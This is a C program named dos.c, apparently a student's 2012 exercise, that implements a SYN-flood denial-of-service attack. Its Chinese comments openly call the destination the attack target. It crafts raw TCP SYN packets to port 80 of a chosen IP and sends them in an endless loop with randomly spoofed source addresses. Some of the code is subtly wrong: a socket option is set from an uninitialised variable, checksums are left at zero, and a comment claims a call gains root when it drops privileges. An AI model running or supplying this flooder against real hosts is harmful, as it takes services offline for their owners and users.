
/*
 * =====================================================================================
 *
 *       Filename:  dos.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  2012年02月24日 23时24分28秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  MaZheng (blog.csdn.net/mazheng1989), mazheng19891019@gmail.com
 *        Company:  Dalian University Of Technology
 *
 * =====================================================================================
 */


#include	<stdio.h>
#include	<unistd.h>
#include	<string.h>
#include	<netinet/in.h>
#include	<sys/socket.h>
#include	<sys/types.h>
#include	<arpa/inet.h>
#include	<netinet/ip.h>
#include	<netinet/tcp.h>

#define	LOCALPORT 3455			/*  */
#include	<stdlib.h>
#define	DESTPORT 80			/*  */
#define MYPORT 8888
int main(int argc,char **argv)
{
	int sockfd;
	struct sockaddr_in addr;
	int on;
	if(argc!=2)
	{
		fprintf(stderr,"usage:%s IP\n\a",argv[0]);
		exit(1);
	}
	bzero(&addr,sizeof(struct sockaddr_in));
	addr.sin_family=AF_INET;
	addr.sin_port=htons(DESTPORT);
	inet_aton(argv[1],&addr.sin_addr);
	/*创建一个TCP的原始套接字*/
	sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
	if(sockfd<0)
	{
		perror("socket error\n");
		exit(1);
	}
	/*设置套接字选项IP_HDRINCL,由用户程序填写IP头部*/
	setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
	setuid(getuid()); /*获得超级用户的权限*/
	char buffer[100];/*定义存放数据报的缓存区*/
	struct ip *ipp;
	struct tcphdr *tcp;
	int head_len;
	/*数据报的长度即IP头部与TCP头部之后*/
	head_len=sizeof(struct ip)+sizeof(struct tcphdr);
	bzero(buffer,100);
	/*开始填充IP数据报的头部*/
	ipp=(struct ip *)buffer;
	ipp->ip_v=IPVERSION; /*IPV4*/
	ipp->ip_hl=sizeof(struct ip)>>2;/*IP数据报的头部长度*/
	ipp->ip_tos=0;               /*服务类型*/
	ipp->ip_len=htons(head_len);/*IP数据报的长度*/
	ipp->ip_id=0;             /*IP id 由内核填写*/
	ipp->ip_off=0;      /*有内核填写*/
	ipp->ip_ttl=MAXTTL;
	ipp->ip_p=IPPROTO_TCP;         /*传输层协议为TCP*/
	ipp->ip_dst=addr.sin_addr;     /*目的地址，即攻击目标*/
	printf("dest address is %s\n",inet_ntoa(addr.sin_addr));
	/*开始填写TCP数据报*/
	tcp=(struct tcphdr*)(buffer+sizeof(struct ip)); /*获取指向TCP头部的指针*/
	tcp->source=htons(LOCALPORT);
	tcp->dest=addr.sin_port; /*目的端口*/
	tcp->seq=random();      /*随机产生序列号*/
	tcp->ack_seq=0;
	tcp->doff=5;
	tcp->syn=1; /*表示SYN数据报*/
	tcp->check=0;
	while(1)
	{
		/*循环发送攻击包*/
		/*随机产生源地址，使服务器收不到最后一个ACK应答*/
		ipp->ip_src.s_addr=random();
		printf("addr is %d\n",ipp->ip_src.s_addr);
		sendto(sockfd,buffer,head_len,0,(struct sockaddr *)&addr,sizeof(struct sockaddr));
		/*发送攻击数据报*/
	}
	return 0;
}
